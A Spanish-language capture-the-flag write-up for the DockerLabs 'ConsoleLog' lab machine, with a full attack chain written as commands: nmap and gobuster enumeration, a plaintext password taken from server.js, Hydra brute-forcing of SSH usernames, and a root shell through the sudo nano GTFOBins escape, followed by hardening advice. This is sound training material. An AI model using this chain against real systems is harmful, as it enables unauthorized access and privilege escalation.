# ConsoleLog

## 📄Write-Up Técnico - Máquina ConsoleLog

--- 
### Información General 

- Nombre: ConsoleLog
- Plataforma: DockerLabs
- Dificultad: Fácil
- Autor del write-up: Marcela Jimenez
- Fecha de resolución: 14/04/2026

---
#### Despliegue de la máquina 

La máquina se descarga desde la plataforma [DockerLabs](https://dockerlabs.es/), generalmente a través de un enlace externo (por ejemplo, MEGA).

Proceso de descarga y preparación:

- Descargar el archivo comprimido desde DockerLabs
- El archivo descargado tiene formato ```.zip```
- Se descomprime:
```bash
unzip consolelog.zip
```
-  Tras la descompresión, se obtiene un archivo ```.tar```:
```bash
consolelog.tar
```
Para desplegar la máquina, se utiliza el script proporcionado:
```bash
bash auto_deploy.sh consolelog.tar
```
Este script carga la imagen, crea el contenedor y asigna la red interna.

---
#### 📁 Preparación del entorno de trabajo

```bash
mkdir consolelog  
cd consolelog  
mkdir nmap
```

Se organiza el entorno para almacenar resultados de reconocimiento.

---
#### Enumeración 🔍

##### Verificación de conectividad

```bash
ping -c 1 172.17.0.2
```

Resultado:

- TTL 64 → Indica sistema Linux (orientativo)

---

#### Escaneo con Nmap 🔍

##### Escaneo inicial

```bash
nmap 172.17.0.2 -p- --open -sS -Pn --min-rate 5000 -T5
```

##### Explicación de parámetros

|Parámetro|Descripción|
|---|---|
|`-p-`|Escaneo de todos los puertos|
|`--open`|Muestra solo abiertos|
|`-sS`|SYN scan|
|`-Pn`|Omite descubrimiento|
|`--min-rate 5000`|Alta velocidad|
|`-T5`|Máxima agresividad|

##### Resultados:

| Puerto | Servicio         |
| ------ | ---------------- |
| 80     | HTTP             |
| 3000   | HTTP alternativo |
| 5000   | SSH              |

---
##### Escaneo de versiones

```bash
nmap 172.17.0.2 -p 80,3000,5000 -sS -Pn -sCV
```

Se identifican servicios web, sin vulnerabilidades directas explotables.

---
#### Análisis del servicio web 🌐

Se accede a:

http://172.17.0.2

No se observan vectores claros, por lo que se procede a enumeración de directorios.

---
#### Fuzzing de directorios con Gobuster 📂

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 50
```
##### Explicación de parámetros

|Parámetro|Función|
|---|---|
|`dir`|Modo de enumeración de directorios|
|`-u`|URL objetivo|
|`-w`|Wordlist|
|`-x`|Extensiones a probar|
|`-t 50`|Número de hilos|

##### Resultados:

- /backend

---

#### Análisis de /backend 🔎

Al acceder a:

http://172.17.0.2/backend

Se encuentra el archivo:

- `server.js`

Este contiene la lógica del backend.

---
#### Obtención de credenciales 🔑

Dentro de `server.js` se identifica una contraseña en texto plano:

lapassworddebackupmaschingonadetodas

No se especifica el usuario asociado.

---
#### Ataque de fuerza bruta con Hydra 💥

Se intenta identificar el usuario válido usando la contraseña encontrada.

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000 -t 20
```

##### Explicación

| Parámetro | Función             |
| --------- | ------------------- |
| `-L`      | Lista de usuarios   |
| `-p`      | Contraseña conocida |
| `ssh://`  | Servicio objetivo   |
| `-t 20`   | Número de tareas    |

##### Resultado:

- Usuario válido: `lovely`
- Contraseña: `lapassworddebackupmaschingonadetodas`

---

#### Acceso SSH 🔐

```bash
ssh lovely@172.17.0.2 -p 5000 
```

Se introduce la contraseña obtenida.

Acceso exitoso como `lovely`.

---
#### Escalada de privilegios 🔺

##### Enumeración

```bash
sudo -l
```

##### Hallazgo crítico 

El usuario puede ejecutar:

```bash
/usr/bin/nano
```

como root.

---
#### Explotación con GTFOBins 

Nano permite ejecutar comandos del sistema.

##### Ejecución

```bash
sudo /usr/bin/nano
```

Dentro de nano:

1. Presionar:

```bash
Ctrl + R  
Ctrl + X
```

2. Escribir:
```bash
reset; sh 1>&0 2>&0
```

##### Explicación técnica

- `Ctrl + R` → abre función de lectura de fichero
- `Ctrl + X` → permite ejecutar comandos externos
- `reset; sh 1>&0 2>&0`:
    - `reset` limpia la terminal
    - `sh` lanza una shell
    - `1>&0 2>&0` redirige stdout y stderr a la entrada estándar

Esto genera una shell interactiva con privilegios de root.

---
#### Obtención de root 👑

```bash
whoami
```

Resultado:

```bash
root
```

---
#### Cadena completa de ataque 

- Escaneo → puertos abiertos (80, 3000, 5000)
- Fuzzing → descubrimiento de `/backend`
- Análisis → acceso a `server.js`
- Credenciales → contraseña en texto plano
- Hydra → descubrimiento del usuario `lovely`
- SSH → acceso inicial
- sudo → ejecución de nano como root
- GTFOBins → escape de shell
- Root → control total

---

#### Recomendaciones 🛡️

- No almacenar credenciales en código fuente
- Restringir acceso a rutas sensibles como `/backend`
- Implementar autenticación robusta
- Limitar permisos de sudo
- Evitar uso de editores como nano con privilegios elevados
- Auditoría de configuraciones en contenedores

---
#### Conclusión

La máquina demuestra cómo una mala gestión de credenciales en el backend puede comprometer completamente el sistema.

Puntos críticos:

- Exposición de contraseña en `server.js`
- Enumeración de rutas accesibles
- Uso inseguro de sudo
- Abuso de binarios confiables (GTFOBins)

----
